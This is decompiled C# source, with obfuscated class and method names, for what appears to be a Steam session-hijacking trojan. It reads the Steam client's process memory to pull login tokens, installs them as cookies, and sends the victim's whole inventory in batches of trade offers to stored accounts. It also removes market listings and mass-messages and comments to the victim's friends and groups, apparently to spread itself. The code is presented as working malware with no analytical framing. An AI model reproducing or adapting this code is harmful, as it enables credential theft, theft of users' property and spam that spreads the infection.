using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

public class GClass0
{
	public enum GEnum0
	{
		Accepted,
		Abuse,
		Error
	}

	public CookieContainer cookieContainer_0 = new CookieContainer();

	private List<string> list_0 = new List<string>();

	private List<string[]> list_1 = new List<string[]>();

	private List<string[]> list_2 = new List<string[]>();

	public List<string> list_3 = new List<string>();

	[CompilerGenerated]
	private string string_0;

	[CompilerGenerated]
	private string string_1;

	[CompilerGenerated]
	private string string_2;

	public void method_0(bool bool_0)
	{
		List<string[]> list = method_9();
		for (int i = 0; i < list.Count; i++)
		{
			string string_ = "";
			if (list[i][3] == "1")
			{
				method_13(list[i][2] + "(" + list[i][1] + ") -> " + method_25() + " abuse detected");
				method_5(list[i][0]);
				continue;
			}
			GEnum0 gEnum = method_1(list[i], out string_);
			if (bool_0)
			{
				switch (gEnum)
				{
				case GEnum0.Accepted:
					method_13(list[i][2] + "(" + list[i][1] + ") -> " + method_25() + " accepted");
					break;
				case GEnum0.Error:
					method_13(list[i][2] + "(" + list[i][1] + ") -> " + method_25() + " Error: \"" + string_ + "\"");
					method_5(list[i][0]);
					break;
				}
			}
		}
	}

	public GEnum0 method_1(string[] string_3, out string string_4)
	{
		string_4 = string.Empty;
		string text = GClass2.smethod_1(cookieContainer_0, "https://steamcommunity.com/tradeoffer/" + string_3[0] + "/accept", "sessionid=" + method_23() + "&tradeofferid=" + string_3[0] + "&partner=" + string_3[1], "tradeoffer/" + string_3[0] + "/");
		if (text != null)
		{
			if (text.IndexOf("tradeid") != -1)
			{
				return GEnum0.Accepted;
			}
			string_4 = text;
			return GEnum0.Error;
		}
		return GEnum0.Error;
	}

	public void method_2(string string_3, string string_4)
	{
		GClass2.smethod_1(cookieContainer_0, "groups/" + string_3, "action=join&sessionID=" + method_23(), "groups/" + string_3);
		string input = GClass2.smethod_1(cookieContainer_0, "groups/" + string_3, null, null);
		MatchCollection matchCollection = new Regex("friends/joinchat/\\d+", RegexOptions.IgnoreCase).Matches(input);
		string text = "";
		foreach (Match item in matchCollection)
		{
			text = item.ToString();
			text = text.Remove(0, 17);
		}
		GClass2.smethod_1(cookieContainer_0, "comment/Clan/post/" + text + "/-1/", "comment=" + string_4 + "&count=6&sessionid=" + method_23(), "groups/" + string_3);
	}

	public void method_3(string string_3, string string_4 = "")
	{
		method_15(string_3, method_25(), string_4);
	}

	public void method_4(string string_3, string string_4, string string_5)
	{
		list_2.Add(new string[3] { string_3, string_4, string_5 });
	}

	public void method_5(string string_3)
	{
		GClass2.smethod_1(cookieContainer_0, "https://steamcommunity.com/tradeoffer/" + string_3 + "/decline", "sessionid=" + method_23(), method_25() + "76561198068284082/tradeoffers");
	}

	public void method_6()
	{
		string input = GClass2.smethod_1(cookieContainer_0, "market/", null, null);
		Regex regex = new Regex("mylisting', '\\d+", RegexOptions.IgnoreCase);
		foreach (Match item in regex.Matches(input))
		{
			GClass2.smethod_1(cookieContainer_0, "market/removelisting/" + item.ToString().Remove(0, 13), "sessionid=" + method_23(), "market/");
		}
	}

	public void method_7(ref List<string[]> list_4, string string_3)
	{
		string[] array = string_3.Split(new char[1] { ',' });
		List<string[]> list = new List<string[]>();
		for (int i = 0; i < list_4.Count; i++)
		{
			for (int j = 0; j < array.Length; j++)
			{
				string[] array2 = list_4[i][4].Split(new char[1] { ' ' });
				for (int k = 0; k < array2.Length; k++)
				{
					if (array2[k] == array[j] && !list.Contains(list_4[i]))
					{
						list.Add(list_4[i]);
						break;
					}
				}
			}
		}
		list_4 = ((list.Count > 0) ? list : null);
	}

	public void method_8()
	{
		list_0.Clear();
		string[] array = GClass2.smethod_1(cookieContainer_0, "profiles/" + method_25() + "/friends/").Split(new string[1] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
		try
		{
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i].IndexOf("name=\"friends") != -1)
				{
					string item = array[i].Split('[', ']')[3];
					if (!list_0.Contains(item))
					{
						list_0.Add(item);
					}
				}
			}
		}
		catch
		{
		}
	}

	public List<string[]> method_9()
	{
		List<string[]> list = new List<string[]>();
		string[] array = GClass2.smethod_1(cookieContainer_0, "profiles/" + method_25() + "/tradeoffers/").Split(new string[1] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
		for (int i = 0; i < array.Length; i++)
		{
			if (array[i].IndexOf("tradeofferid_") == -1 || array[i + 11].IndexOf("inactive") != -1)
			{
				continue;
			}
			int num = -1;
			for (int j = i; j < array.Length; j++)
			{
				if (array[j].IndexOf("tradeoffer_footer") != -1)
				{
					num = j;
					break;
				}
			}
			bool flag = false;
			int num2 = num;
			while (num2 > 0 && array[num2].IndexOf("tradeoffer_item_list") == -1)
			{
				if (array[num2].IndexOf("trade_item") == -1)
				{
					num2--;
					continue;
				}
				flag = true;
				break;
			}
			list.Add(new string[4]
			{
				array[i].Split(new char[1] { '"' })[3].Split(new char[1] { '_' })[1],
				array[i + 1].Split(new char[1] { '\'' })[1],
				Uri.UnescapeDataString(array[i + 1].Split(new string[1] { "&quot;" }, StringSplitOptions.RemoveEmptyEntries)[1]),
				flag ? "1" : "0"
			});
		}
		return list;
	}

	public List<string[]> method_10(string string_3, string string_4, string[] string_5)
	{
		List<string[]> list_ = new List<string[]>();
		if (string_5 == null)
		{
			string text = "profiles/" + string_3 + "/inventory/json/" + string_4 + "/2/?trading=1&market=1";
			string text2 = GClass2.smethod_1(cookieContainer_0, text);
			try
			{
				list_ = new Class2().method_2(text2, "2");
			}
			catch
			{
				return null;
			}
		}
		else
		{
			for (int i = 0; i < string_5.Length; i++)
			{
				string text = "profiles/" + string_3 + "/inventory/json/" + string_4 + "/" + string_5[i] + "/?trading=1&market=1";
				string text2 = GClass2.smethod_1(cookieContainer_0, text);
				try
				{
					List<string[]> list_2 = new Class2().method_2(text2, string_5[i]);
					method_14(ref list_, list_2);
				}
				catch
				{
				}
			}
		}
		if (list_.Count <= 0)
		{
			return null;
		}
		return list_;
	}

	public void method_11()
	{
		while (!GClass2.smethod_0(cookieContainer_0))
		{
		}
		if (cookieContainer_0.Count < 4)
		{
			cookieContainer_0 = new CookieContainer();
			method_33(bool_0: true);
			Thread.Sleep(100);
			method_11();
		}
		else
		{
			method_24(method_19(cookieContainer_0, "sessionid"));
		}
	}

	public void method_12()
	{
		string[] array = GClass2.smethod_1(cookieContainer_0, "chat/").Split(new string[1] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
		int i;
		for (i = 0; i < array.Length; i++)
		{
			if (array[i].IndexOf("WebAPI = new CWebAPI") != -1)
			{
				method_22(array[i].Split(new char[1] { '"' })[1]);
				break;
			}
		}
		string text = method_28(13);
		string[] array2 = GClass2.smethod_1(cookieContainer_0, "https://api.steampowered.com/ISteamWebUserPresenceOAuth/Logon/v0001/?jsonp=jQuery" + method_28(22) + "_" + text + "&ui_mode=web&access_token=" + method_21() + "&_=" + text).Split(new char[1] { '"' });
		i = 0;
		while (true)
		{
			if (i < array2.Length)
			{
				if (array2[i] == "umqid")
				{
					break;
				}
				i++;
				continue;
			}
			return;
		}
		method_17(array2[i + 2]);
	}

	public void method_13(string string_3)
	{
		try
		{
			using StreamWriter streamWriter = File.AppendText("log.txt");
			streamWriter.WriteLine(DateTime.Now.ToString("[dd.MM.yyyy hh:mm:ss] ") + string_3);
		}
		catch
		{
		}
	}

	private void method_14(ref List<string[]> list_4, List<string[]> list_5)
	{
		if (list_5 == null)
		{
			return;
		}
		for (int i = 0; i < list_5.Count; i++)
		{
			if (!list_4.Contains(list_5[i]))
			{
				list_4.Add(list_5[i]);
			}
		}
	}

	private void method_15(string string_3, string string_4, string string_5 = "")
	{
		string[] array = string_3.Split(new char[1] { ',' });
		if (string_3.Length <= 1)
		{
			return;
		}
		for (int i = 0; i < array.Length; i++)
		{
			List<string[]> list_ = method_10(string_4, array[i], (array[i] != "753") ? null : new string[4] { "1", "3", "6", "7" });
			if (list_ != null)
			{
				if (string_5 != string.Empty && string_5.Contains(array[i]))
				{
					method_7(ref list_, smethod_0(string_5, array[i]));
				}
				if (list_ != null)
				{
					list_1.AddRange(list_);
				}
			}
		}
	}

	[CompilerGenerated]
	private string method_16()
	{
		return string_2;
	}

	[CompilerGenerated]
	private void method_17(string string_3)
	{
		string_2 = string_3;
	}

	private List<string[][]> method_18(List<string[]> list_4, int int_0)
	{
		List<string[][]> list = new List<string[][]>();
		int num = 0;
		if (list_4 != null)
		{
			List<string[]> list2 = new List<string[]>();
			for (int i = 0; i < list_4.Count; i++)
			{
				list2.Add(list_4[i]);
				num++;
				if (num == int_0)
				{
					list.Add(list2.ToArray());
					list2.Clear();
					num = 0;
				}
			}
			if (list2.Count > 0)
			{
				list.Add(list2.ToArray());
			}
			return list;
		}
		return null;
	}

	private string method_19(CookieContainer cookieContainer_1, string string_3)
	{
		Hashtable hashtable = (Hashtable)typeof(CookieContainer).GetField("m_domainTable", BindingFlags.Instance | BindingFlags.NonPublic)!.GetValue(cookieContainer_1);
		foreach (string key3 in hashtable.Keys)
		{
			object obj = hashtable[key3];
			SortedList sortedList = (SortedList)obj.GetType().GetField("m_list", BindingFlags.Instance | BindingFlags.NonPublic)!.GetValue(obj);
			foreach (string key4 in sortedList.Keys)
			{
				CookieCollection cookieCollection = (CookieCollection)sortedList[key4];
				foreach (Cookie item in cookieCollection)
				{
					if (item.Name == string_3)
					{
						return item.Value.ToString();
					}
				}
			}
		}
		return string.Empty;
	}

	private string method_20(string string_3, string string_4, string[] string_5, string string_6 = "")
	{
		return GClass2.smethod_1(cookieContainer_0, "tradeoffer/new/send", "&serverid=1&sessionid=" + string_3 + "&partner=" + string_5[0] + "&tradeoffermessage=" + Uri.EscapeDataString(string_6) + "&json_tradeoffer=" + Uri.EscapeDataString(string.Format("{5}\"newversion\":true,\"version\":2,\"me\":{5}\"assets\":[{3}],\"currency\":[],\"ready\":false{6},\"them\":{5}\"assets\":[],\"currency\":[],\"ready\":false{6}{6}", string_3, string_5[0], string_6, string_4, string_5[2], "{", "}")) + "&trade_offer_create_params=" + Uri.EscapeDataString(string.Format("{0}\"trade_offer_access_token\":\"{2}\"{1}", "{", "}", string_5[2])), "tradeoffer/new/?partner=" + string_5[1] + "&token=" + string_5[2]);
	}

	[CompilerGenerated]
	private string method_21()
	{
		return string_0;
	}

	[CompilerGenerated]
	private void method_22(string string_3)
	{
		string_0 = string_3;
	}

	[CompilerGenerated]
	private string method_23()
	{
		return string_1;
	}

	[CompilerGenerated]
	private void method_24(string string_3)
	{
		string_1 = string_3;
	}

	private string method_25()
	{
		if (list_3.Count <= 0)
		{
			return null;
		}
		return list_3[0].Substring(0, 17);
	}

	public void method_26()
	{
		list_3.Clear();
		GClass1.GStruct1 gstruct1_ = default(GClass1.GStruct1);
		while (gstruct1_.intptr_0.ToInt32() == 0)
		{
			GClass1.GetSystemInfo(out gstruct1_);
		}
		IntPtr intptr_ = gstruct1_.intptr_0;
		long num = intptr_.ToInt32();
		List<string> list = new List<string>();
		Process[] processesByName = (processesByName = Process.GetProcessesByName("steam"));
		Process process = null;
		for (int i = 0; i < processesByName.Length; i++)
		{
			try
			{
				foreach (ProcessModule module in processesByName[i].Modules)
				{
					if (module.FileName!.EndsWith("steamclient.dll"))
					{
						process = processesByName[i];
					}
				}
			}
			catch
			{
			}
		}
		if (process == null)
		{
			return;
		}
		IntPtr intptr_2 = GClass1.OpenProcess(1040u, bool_0: false, process.Id);
		GClass1.GStruct0 gstruct0_ = default(GClass1.GStruct0);
		IntPtr intptr_3 = new IntPtr(0);
		while (GClass1.VirtualQueryEx(intptr_2, intptr_, out gstruct0_, 28u) != 0)
		{
			if (gstruct0_.uint_3 == 4 && gstruct0_.uint_2 == 4096)
			{
				byte[] array = new byte[gstruct0_.uint_1];
				GClass1.ReadProcessMemory(intptr_2, gstruct0_.intptr_0, array, gstruct0_.uint_1, out intptr_3);
				string @string = Encoding.UTF8.GetString(array);
				MatchCollection matchCollection = new Regex("7656119[0-9]{10}%7c%7c[A-F0-9]{40}", RegexOptions.IgnoreCase).Matches(@string);
				if (matchCollection.Count > 0)
				{
					foreach (Match item in matchCollection)
					{
						if (!list.Contains(item.Value))
						{
							list.Add(item.Value);
						}
					}
				}
			}
			num += gstruct0_.uint_1;
			if (num >= 2147483647L)
			{
				break;
			}
			intptr_ = new IntPtr(num);
		}
		list_3 = list;
		if (list.Count >= 2)
		{
			method_33(bool_0: false);
			return;
		}
		list_3.Clear();
		method_26();
	}

	public string method_27(string[][] string_3)
	{
		string text = string.Empty;
		for (int i = 0; i < string_3.Length; i++)
		{
			text += string.Format("{4}\"appid\":{0},\"contextid\":\"{1}\",\"amount\":{2},\"assetid\":\"{3}\"{5},", string_3[i][0], string_3[i][5], string_3[i][1], string_3[i][2], "{", "}");
		}
		return text.Remove(text.Length - 1);
	}

	public string method_28(int int_0)
	{
		Random random = new Random();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < int_0; i++)
		{
			stringBuilder.Append(random.Next(0, 10)).ToString();
		}
		return stringBuilder.ToString();
	}

	public void method_29(string string_3 = "")
	{
		if (list_1 == null)
		{
			return;
		}
		List<string[][]> list = method_18(list_1, 256);
		if (list == null)
		{
			return;
		}
		for (int i = 0; i < list_2.Count; i++)
		{
			for (int j = 0; j < 5; j++)
			{
				int num = j + i * 5;
				if (num >= list.Count)
				{
					break;
				}
				Thread.Sleep(50);
				string string_4 = method_27(list[num]);
				method_20(method_19(cookieContainer_0, "sessionid"), string_4, list_2[i], string_3);
			}
		}
	}

	public void method_30(string string_3, string string_4)
	{
		string text = method_28(22);
		string text2 = method_28(13);
		string text3 = string.Format("https://api.steampowered.com/ISteamWebUserPresenceOAuth/Message/v0001/?jsonp=jQuery{0}_{1}&umqid={2}&type=saytext&steamid_dst={3}&text={4}&access_token={5}&_={1}", text, text2, method_16(), string_3, Uri.EscapeDataString(string_4), method_21());
		GClass2.smethod_1(cookieContainer_0, text3);
	}

	public void method_31(string string_3)
	{
		for (int i = 0; i < list_0.Count; i++)
		{
			string text = method_28(22);
			string text2 = method_28(13);
			string text3 = string.Format("https://api.steampowered.com/ISteamWebUserPresenceOAuth/Message/v0001/?jsonp=jQuery{0}_{1}&umqid={2}&type=saytext&steamid_dst={3}&text={4}&access_token={5}&_={1}", text, text2, method_16(), list_0[i], Uri.EscapeDataString(string_3), method_21());
			GClass2.smethod_1(cookieContainer_0, text3);
			Thread.Sleep(500);
		}
	}

	public void method_32(string string_3)
	{
		for (int i = 0; i < list_0.Count; i++)
		{
			GClass2.smethod_1(cookieContainer_0, "comment/Profile/post/" + list_0[i] + "/-1/", "comment=" + string_3 + "&count=6&sessionid=" + method_23(), null);
			Thread.Sleep(500);
		}
	}

	public void method_33(bool bool_0)
	{
		cookieContainer_0.SetCookies(new Uri("http://steamcommunity.com"), "steamLogin=" + list_3[(!bool_0) ? 1 : 0]);
		cookieContainer_0.SetCookies(new Uri("http://steamcommunity.com"), "steamLoginSecure=" + list_3[bool_0 ? 1 : 0]);
	}

	private static string smethod_0(string string_3, string string_4)
	{
		if (string_3.Contains(string_4))
		{
			string[] array = string_3.Split(new char[2] { ':', ';' }, StringSplitOptions.RemoveEmptyEntries);
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] == string_4)
				{
					string text = array[i + 1];
					if (text != null)
					{
						return text;
					}
				}
			}
		}
		return null;
	}
}
